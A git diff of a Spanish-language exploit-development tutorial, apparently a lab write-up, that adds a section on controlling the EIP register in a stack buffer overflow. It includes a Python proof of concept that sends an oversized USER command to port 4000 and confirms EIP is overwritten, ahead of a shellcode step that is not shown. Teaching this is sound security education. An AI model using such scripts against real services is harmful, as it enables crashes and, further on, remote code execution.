@@ -144,6 +144,7 @@ except:
   sys.exit(0)
 
 ```
+
 Lo que conseguimos con esto es determinar a través del valor del registro **EIP** desde **Immunity Debugger** una vez se produce la violación de segmento, qué caracteres están sobreescribiendo dicho registro.
 
 Supongamos que el registro **EIP** toma este valor tras la detención del servicio una vez producido el desbordamiento:
@@ -166,6 +167,47 @@ $~ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 9Bb0
 
 [*] Exact match at offset 809
 ```
+
+-   Controlando el registro EIP
+
+Conociendo ya el offset, podemos tomar el control del registro EIP. Dado que el registro **EIP** apunta a la siguiente dirección a ejecutar (pues dirige el flujo del programa), poder sobrescribir su valor es crucial para conseguir una ejecución alternativa del servicio a nivel de sistema (lo veremos más adelante).
+
+Dado que el offset es 809, podemos crear el siguiente PoC a fin de verificar que tenemos el control del registro **EIP**:
+
+```python
+#!/usr/bin/python
+# coding: utf-8
+
+import sys,socket
+
+if len(sys.argv) != 2:
+  print "\nUso: python" + sys.argv[0] + " <dirección-ip>\n"
+  sys.exit(0)
+
+buffer = "A"*809 + "B"*4 + "C"*(900-809-4)
+
+ipAddress = sys.argv[1]
+
+port = 4000
+
+try:
+  print "Enviando búffer..."
+  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+  s.connect((ipAddress, port))
+  s.recv(1024)
+  s.send("USER " + buffer + '\r\n')
+  s.recv(1024)
+  s.close()
+except:
+  print "\nError de conexión...\n"
+  sys.exit(0)
+
+```
+
+El caracter "C" lo meto como Padding para hacer relleno hasta llegar a los 900 (para trabajar con cifras redondas).
+
+Tras la ejecución del script, desde el **Immunity Debugger** veremos que una vez se produce la violación de segmento, el registro **EIP** toma el valor **42424242**, lo que en otras palabras se resumen en **"B"*4**. Llegados a este punto, es hora de encontrar el lugar en el que se situará nuestro Shellcode.
+
 
 
 
